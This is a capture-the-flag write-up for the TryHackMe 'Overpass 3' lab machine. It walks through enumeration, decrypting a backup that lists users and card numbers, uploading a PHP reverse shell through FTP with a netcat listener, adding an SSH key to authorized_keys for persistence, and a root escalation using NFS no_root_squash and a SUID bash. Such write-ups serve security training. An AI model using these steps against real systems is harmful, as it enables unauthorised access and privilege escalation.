# Overpass 3 – Hosting [Tryhackme](https://tryhackme.com/room/overpass3hosting)

## description:
The Overpass 3 – Hosting machine is a medium-difficulty box that combines multiple attack vectors: backup file analysis, SSH key management, webshell upload via FTP, NFS misconfiguration, and privilege escalation through ```no_root_squash```. This writeup covers the exploitation path step by step.

## Enumeration

We start with scanning:

```python
nmap -sC -sV -p- -T4 10.10.195.229
```
Open ports:

* 21/tcp – FTP

* 22/tcp – SSH

* 80/tcp – HTTP

Visiting the main page on port 80 didn’t reveal anything useful, so we moved on to directory scanning:

```python
gobuster dir -u 10.10.195.229 -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt
```
## Initial Foothold

> Hint: This flag belongs to apache

From the scan we discovered ```/backups``` containing a ```backup.zip```. After downloading and extracting, we found a private key and a ```.gpg``` file.

We first import the GPG key:

```python
gpg --import priv.key
gpg --decrypt CustomerDetails.xlsx.gpg > output.xlsx
```
This gave us access to an ```.xlsx``` file, which listed three users:

```python
Customer Name    	Username	       Password	          Credit card number	   CVC
Par. A. Doxx	    paradox	         *****************	4111 1111 4555 1142	   432
0day Montgomery     0day	         *****************	5555 3412 4444 1115	   642
Muir Land	        muirlandoracle	 *****************	5103 2219 1119 9245	   737
```

The user of interest is paradox. SSH login didn’t work, so we tried FTP instead:

```python
ftp 10.10.195.229
```
We uploaded a reverse shell:

```python
put reverseshell.php
```
On our machine:

```python
nc -lvnp 4444
```
Then triggered it by visiting:

```python
http://10.10.195.229/reverseshell.php
```
Got a shell as ```apache```.

Navigating to ```/usr/share/httpd```, we found and read ```web.flag```.

## User Access

With the recovered password for ```paradox```, we switched users:

```python
su paradox
```
To get a stable shell, we set up SSH key authentication. On attacker machine:

```python
ssh-keygen
```
Copy the contents of ```id_ed25519.pub``` and append it to the victim:

```python
echo "<contents_of_pub>" >> /home/paradox/.ssh/authorized_keys
```
Now we can log in as:

```python
ssh -i /home/kali/.ssh/id_ed25519 paradox@10.10.195.229
```

## Privilege Escalation

Running <b>linpeas.sh</b> revealed an NFS service running on port <b>2049</b>. We set up port forwarding:

```python
ssh -i id_rsa -L 2049:127.0.0.1:2049 paradox@machine-ip
```
On attacker machine, mount the export:

```python
mkdir flag
sudo mount -t nfs -o port=2049 localhost:/ flag
```
Inside, we found and read user.flag.

Next, exploiting the no_root_squash misconfiguration:

On victim:

```python
cp /bin/bash .
```
On attacker:

```python
sudo chown root:root bash
sudo chmod u+s bash
```
Back on victim:

```python
./bash -p
```
Now root access is achieved:

```python
cat /root/root.flag
```
